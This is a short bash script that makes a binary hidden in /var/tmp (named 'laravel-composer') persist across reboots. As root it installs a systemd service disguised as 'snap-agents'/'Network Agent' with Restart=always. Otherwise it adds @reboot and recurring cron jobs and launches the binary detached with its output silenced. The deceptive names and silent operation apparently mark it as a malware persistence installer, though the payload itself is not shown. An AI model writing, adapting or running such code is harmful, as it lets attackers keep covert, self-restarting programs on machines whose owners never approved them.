#!/bin/bash

AGENT_PATH="/var/tmp/laravel-composer"
SERVICE_BASE_NAME="snap-agents"

if [[ ! -f "$AGENT_PATH" ]]; then
    exit 1
fi

chmod +x "$AGENT_PATH"

if [[ $EUID -eq 0 ]]; then
    
    find_available_service_name() {
        local base_name="$1"
        local service_name="${base_name}.service"
        local counter=1
        
        if ! systemctl list-unit-files | grep -q "^${service_name}"; then
            echo "$service_name"
            return
        fi
        
        while systemctl list-unit-files | grep -q "^${base_name}-${counter}.service"; do
            ((counter++))
        done
        
        echo "${base_name}-${counter}.service"
    }
    
    SERVICE_NAME=$(find_available_service_name "$SERVICE_BASE_NAME")
    SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
    
    cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$AGENT_PATH
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    chmod 644 "$SERVICE_PATH"
    
    systemctl daemon-reload
    
    if systemctl enable "$SERVICE_NAME" 2>/dev/null; then
        :
    else
        exit 1
    fi
    
    if systemctl start "$SERVICE_NAME" 2>/dev/null; then
        :
    else
        exit 1
    fi
    
    systemctl status "$SERVICE_NAME" --no-pager >/dev/null 2>&1
    
else
    
    if ! command -v crontab &> /dev/null; then
        exit 1
    fi
    
    TEMP_CRON="/tmp/.cron_backup_$$"
    
    crontab -l 2>/dev/null > "$TEMP_CRON" || true
    
    REBOOT_JOB="@reboot setsid nohup $AGENT_PATH >/dev/null 2>&1 &"
    MINUTE_JOB="0 */5 * * * setsid nohup $AGENT_PATH >/dev/null 2>&1 &"
    
    if ! grep -Fq "$REBOOT_JOB" "$TEMP_CRON" 2>/dev/null; then
        echo "$REBOOT_JOB" >> "$TEMP_CRON"
    fi
    
    if ! grep -Fq "$MINUTE_JOB" "$TEMP_CRON" 2>/dev/null; then
        echo "$MINUTE_JOB" >> "$TEMP_CRON"
    fi
    
    if crontab "$TEMP_CRON"; then
        :
    else
        rm -f "$TEMP_CRON"
        exit 1
    fi
    
    rm -f "$TEMP_CRON"
    
    setsid nohup "$AGENT_PATH" >/dev/null 2>&1 &
fi
